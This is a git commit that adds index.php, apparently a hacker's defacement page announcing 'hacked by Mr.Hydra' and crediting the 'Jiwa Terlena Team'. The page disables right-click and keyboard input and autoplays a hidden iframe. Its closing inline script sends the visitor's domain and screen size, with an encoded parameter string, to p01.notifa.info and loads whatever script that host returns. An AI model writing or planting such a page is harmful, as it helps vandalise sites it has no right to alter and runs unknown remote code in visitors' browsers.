2c7366378c9c8be496cef6c26b49b68b5ebe6585
hydraxanon <48046976+hydraxanon@users.noreply.github.com>
2019-02-27 14:23:55 +0700

    Create index.php

---
+++ index.php
@@ -0,0 +1,30 @@
+
+<head>
+<title>Sleep in mind</title>
+<meta name="robots" content="index, follow">
+<meta name="description" content="hacked by Mr.Hydra","Mr.Hydra Hackeado por">
+<meta name="keywords" content="hacked by Mr.Hydra","Hacked By Mr.Hydra","Pwned By Mr.Hydra","Kissed By Mr.Hydra","HACKEADO POR Mr.Hydra","PWNED BY Mr.Hydra","KISSED BY Mr.Hydra","LEAKED BY Mr.Hydra","Leaked By Mr.Hydra"/>
+<meta name="googlebot" content="index,follow"/>
+<meta name="robots" content="all"/>
+<meta name="robots schedule" content="auto"/>
+<meta name="distribution" content="global"/>
+<base target="_blank"/>
+<link href='http://fonts.googleapis.com/css?family=Anton' rel='stylesheet' type='text/css'>
+<style>
+body { 
+  background: black; 
+  -webkit-background-size: cover;
+  -moz-background-size: cover;
+  -o-background-size: cover;
+  background-size: cover;
+  color: white;
+}
+
+
+}</style>
+</head>
+<body bgcolor="black" oncontextmenu="return false;" onkeydown="return false;" onmousedown="return false;">
+<iframe width="1" height="1" src="https://www.youtube.com/embed/WMo3lO_GEvk?autoplay=1" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen=""></iframe>
+
+<center><div class="indonesia"><center><table width=100% height=100%><td align=center><br><img width="30%" src="https://f4.bcbits.com/img/a2100940567_10.jpg"><br><br> <font face=" Anton " style="color: red; text-shadow: 0px 1px 5px darkred;"> ~ Mr.Hydra / Jiwa Terlena Team ~</font><br> <font face=" Anton " style="color: white; text-shadow: 0px 1px 7px red;">Gend3ruw0 - Alazka - Mr.Hydra - Acenk404 - AndroGhost - kar18 - KID2ZON3 - BDJ-007
+</font><br><font face=" Anton " style="color: aqua; text-shadow: 0px 1px 7px red;">&copy; Jiwa Terlena Team</font></td></table></div></center><script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdo2OrugPP638GiBWzyFH0kls%2fBXX2%2bhXVSSd4V3xx9BJ61QjdddzR6B1PF0kaqc4cXsYg%2foJY3CJ%2fTwZ4F876Kw4F84mHUdHfurwU2ztk4Ct2S7y75N%2fgqreUjCuvk4fBoYPT%2bfCk9IC6WDmocHbCaFywaXMPZX5JgGaMMoNYITz1LYtBk3784hw2l01rRY5Qrr6PiE0kRYdF23qSCWzqncEstN9x2j%2fuIBh6OuCfXoHWecQw%2fEyDHEnI2b5qvSih3XcJwteVWkVC84Dtrp%2bjclib%2fHbPlFdVJ5Eqaj7f6SsIa9WVlFx1oEmpAm8diIMn808CCyfn1uLGADLsKov%2f0Lgnv0YXVGlnf4mSBuvvVknHoff3x3o0HH8QBxDspTD6fi7peEbBXlrSllLCmPh3bowegy80sgCgOptAAN6I7g73Z%2fiOkmDxluwaxeryrjd2JxaxZORTG%2bs%2fwaULN311HQArff3fljCBw0Ww4fs3G9jwFOEAm9TNIcaOYrguu8KXfXHyebjlsAN6zIIPnCZdlmm9PmHI7IP8vTjjfGV1KkLaeQr3otdtqwIIadKSnC40qhqinuV5nnsfeMoHfoJvy6%2fIurfRIpvQ%2fvQ0%2bxtwhYiRuaJqPh4HPQePs7Aqs9DM1Y2zVU3NqqYJ0NAM%2bSlhNg%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body></html>
